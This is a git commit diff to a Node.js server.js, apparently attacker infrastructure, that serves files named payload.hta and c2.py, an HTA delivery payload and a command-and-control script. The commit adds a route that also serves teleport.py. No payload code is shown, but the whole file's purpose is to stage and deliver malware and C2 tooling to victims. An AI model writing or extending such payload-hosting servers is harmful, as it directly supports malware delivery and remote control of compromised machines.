81f1593e265db5e705f7f2c69dfae1aa883a4f41
sableaks <ghostyhax3r@gmail.com>
2026-08-14 00:50:36 +0300

    Update server.js

--- server.js
+++ server.js
@@ -5,11 +5,15 @@ const PORT = process.env.PORT || 8080;
 
 const htaContent = fs.readFileSync(path.join(__dirname, 'payload.hta'), 'utf8');
 const c2Content = fs.readFileSync(path.join(__dirname, 'c2.py'), 'utf8');
+const teleportContent = fs.readFileSync(path.join(__dirname, 'teleport.py'), 'utf8');
 
 const server = http.createServer((req, res) => {
     if (req.url.endsWith('.hta')) {
         res.writeHead(200, {'Content-Type': 'application/hta'});
         res.end(htaContent);
+    } else if (req.url.endsWith('teleport.py')) {
+        res.writeHead(200, {'Content-Type': 'text/plain'});
+        res.end(teleportContent);
     } else if (req.url.endsWith('.py')) {
         res.writeHead(200, {'Content-Type': 'text/plain'});
         res.end(c2Content);
